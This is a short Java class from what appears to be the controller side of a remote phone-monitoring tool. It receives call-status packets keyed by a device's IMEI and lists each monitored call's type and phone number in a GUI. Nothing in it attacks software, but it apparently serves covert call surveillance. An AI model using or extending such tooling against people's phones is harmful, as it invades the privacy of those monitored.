package handler;

import gui.GUI;
import server.Server;
import Packet.CallStatusPacket;
import Packet.Packet;
import Packet.RawPacket;

public class CallMonitorHandler implements PacketHandler {
	
	private GUI gui;
	private int channel;
	private String imei;
	
	public CallMonitorHandler(int channel, String imei, GUI gui) {
		this.gui = gui;
		this.channel = channel;
		this.imei = imei;
	}

	@Override
	public void receive(Packet p, String imei) {
		// TODO Auto-generated method stub
		
	}

	@Override
	public void handlePacket(Packet p, String temp_imei, Server c) {
		gui.logTxt("Call monitoring data has been received");
		c.getChannelHandlerMap().get(imei).getStorage(channel).reset();
		CallStatusPacket packet = (CallStatusPacket) p;
		gui.addMonitoredCall(imei, packet.getType(), packet.getPhonenumber());
	}

}
